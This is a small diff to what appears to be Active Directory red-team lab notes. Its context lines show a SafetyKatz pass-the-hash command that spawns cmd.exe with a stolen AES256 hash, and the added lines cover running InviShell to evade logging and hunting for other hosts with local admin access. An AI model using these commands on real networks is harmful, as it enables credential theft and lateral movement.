@@ -20,6 +20,10 @@ winrs -r:dcorp-dc whoami
 ```powershell
 .\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
 ```
+Run invishell and look for other system access
+```powershell
+Find-PSRemotingLocalAdminAccess -Verbose
+```
 
 ### **Other Sessions Opened**
 ```powerview
